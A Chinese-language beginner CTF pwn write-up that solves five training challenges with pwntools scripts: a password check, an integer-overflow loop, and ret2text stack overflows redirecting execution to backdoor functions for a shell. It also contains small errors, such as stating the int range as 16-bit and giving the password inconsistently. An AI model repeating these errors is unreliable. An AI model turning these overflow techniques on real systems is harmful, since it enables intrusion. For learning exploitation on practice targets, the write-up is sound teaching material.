# 解题wp
## 题目1
开启靶机

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606001-314958e4-36d0-4f15-9188-443d7c165fc4.png)

解释一下node5.buuoj.cn:25501：node5.buuoj.cn是ip，25501是端口

随后去虚拟机nc连一下

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606057-44f39104-1f92-42a6-95e6-87059524623c.png)

注意格式，nc(空格)ip(空格)端口

此题直接执行了system(/bin/sh)，所以不需要我们任何操作就拿到了shell(电脑控制权)

接下来就可以对靶机进行操作寻找flag了

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606072-5aa48fda-d99c-4e09-a0d4-4ab50152a0ee.png)

ls列出当前目录内容，看到有文件叫做flag

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606098-1a2568a6-9a19-4774-8b95-ef0a7baf8f66.png)

cat flag打开拿到flag，可以复制提交了

## 题目2
检查题目保护机制，发现是64位程序，将题目附件拖入IDA64位中

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606118-4367f0f5-e97f-42e2-8f6b-48d271761727.png)

按F5反汇编

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607187-3c959db6-3ea3-406d-87d5-60421cd8a945.png)

发现只要输入的值等于7038329，就符合if条件执行system(/bin/sh)，这也是一道pwn题最终的目的

**远程**：你可以nc连一下靶机然后输入708329，这样就打通了

**本地：**./文件名 运行，（运行不了就输入chmod 777 文件名提升权限）输入708329打通

ps：本地打通后输入ls显示的是你自己电脑的当前目录内容，所以自然没有flag文件，不过这样就代表打通了，想体验拿flag爽感的去打远程

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606826-001f3a9f-f6c4-4480-a72d-0c52e2a895f2.png)

### 怎么写脚本
下面给出如何用脚本做题（因为后续的题目没有那么简单）

在终端输入vim exp.py（不要直接在这个页面进行编写）

esc+shift+:

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607030-3a7fe62f-0009-41ea-98d6-fb7325292ade.png)

可以在左下角输入了，输入wq（保存并退出）

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698606998-d9b0b935-7dd1-4995-aa5f-5c39af125177.png)

双击py文件进去编写脚本

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607428-a2e80770-e9b2-4613-b3be-ee8a1321f9e5.png)

这基本上算是模板了，具体每一句是干嘛的查看pwntools的使用

### 本题exp：
```plain
from pwn import *
context(log_level="debug",arch='amd64',os="linux")
#p =process("./door")
p=remote("39.106.57.152",30756)

p.recvuntil("password: ")
p.sendline(b'7038329')

p.interactive()
```

写好了python3执行

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607554-52bf34e3-5acc-4095-8a72-ed9c993cd73f.png)

拿到flag

## 题目3
依旧固定步骤

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607612-ab895381-d4c8-4a4e-8922-bf69a4f5615a.png)

Ida查看func函数逻辑

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607687-70e4a0c7-f258-4ed5-bff2-a087157f41da.png)

先让我们输入v2，v2不能小于0，然后每次循环v1都会自增，v1小于0时就能直接执行system("cat flag")拿到flag

但是v1初始是0还不断增加，怎么可能小于0呢？？？

注意看v1是int类型，int类型数的范围是<font style="color:rgb(143,149,158);">-32768~32767；(即-2^15~2^15-1)</font>

所以当v1增加到32768其实是等于-32768**（原理请学习整数溢出）**，这样就满足条件了

### 本题exp：
```plain
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
#p = process("./INTbug")
p = remote("8.147.132.32",39721)


for _ in range (32768):
    p.sendline(b'1')
    

p.interactive()
```

## 题目4
**<font style="color:rgb(216,57,49);">一定提前学习</font>****<font style="color:rgb(216,57,49);">栈溢出</font>****<font style="color:rgb(216,57,49);">原理！！！！！</font>**

64位，Canary和PIE都关了，正常栈溢出

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698607963-58460948-e6d1-4cc2-a294-457e708c7b7a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608062-788e26ce-c78b-4109-9138-e12cd0c9d7ad.png)

buf距rbp的位置是0x100，但能read0x140个字节，存在溢出，填充0x100个字节到rbp，因为rbp本身是8个字节，所以再填充八位垃圾数据，下一个写的地方就是返回地址，把返回地址覆盖成后门函数，这样程序的执行流就被我们修改了，执行完vuln函数会返回到后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608158-75cbdf00-d3f1-4774-9921-4ecdde403d09.png)

这个IDA View-A是汇编代码，点空格就会变成这样，可以找函数地址，发现backdoor地址为0x4011CA

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608391-dac9349e-ffb9-4934-989f-0f8baa4ca7db.png)

那么应该这样写对吧

```plain
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p = process("./ret2text2")


p.recvuntil("It's a easy challenge")
backdoor=0x4011ca
payload=b'A'*0x108+p64(backdoor)

p.sendline(payload)
 
p.interactive()
```

但你会发现打不通，爆EOF

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608520-f11fa5e7-0d5a-463c-96fe-06c84c81c762.png)

OK此处去简单了解知识点：**堆栈平衡**（只有64位会出现这种情况）

原理慢慢理解，直接给方法，下面给出两种方法解决

### 1、加ret
![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608776-5b307e2e-6b5f-43fe-a457-bf298bddb49b.png)

```plain
ret=0x40101a
payload=b'A'*0x108+p64(ret)+p64(backdoor)
```

### 2、找合适的后门地址
![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608553-46b11a03-da88-4f20-b7f3-9cb913fcb0f3.png)

把后门地址改成0x4011CF，也就是mov rbp,rsp这一步的地址

### 本题exp：
```plain
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p = process("./ret2text2")


p.recvuntil("It's a easy challenge")
backdoor=0x4011cf
payload=b'A'*0x108+p64(backdoor)

p.sendline(payload)
 
p.interactive()
```

## 题目5
一样的题，checksec我省略了，直接看函数

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608719-146e153a-ab82-455f-a284-9acdedfbb7d3.png)

gets更爽，因为可以写无限个字节，v1距离rbp0x20个字节，加上rbp就是0x28

找后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608936-3f1786d5-7ea7-402d-9553-f762650a8d46.png)

你以为这是后门函数？再仔细看看呢！！它只是把system('/bin/sh')用puts打印出来了

![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698609046-30b47798-d33f-4616-bb30-94587ea0b071.png)

真正的后门在这

execve(“/bin/sh”,0,0)是干嘛的搜索一下，其实就是和system('/bin/sh')等价

### 本题exp：
这题又不需要加ret，具体原理比较复杂，总之做的时候大家试一下就好

```plain
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p=process('./ret2text1')


payload=b'A'*0x28+p64(0x401257)

p.sendline(payload)

p.interactive()
```

# 学习笔记
xxx

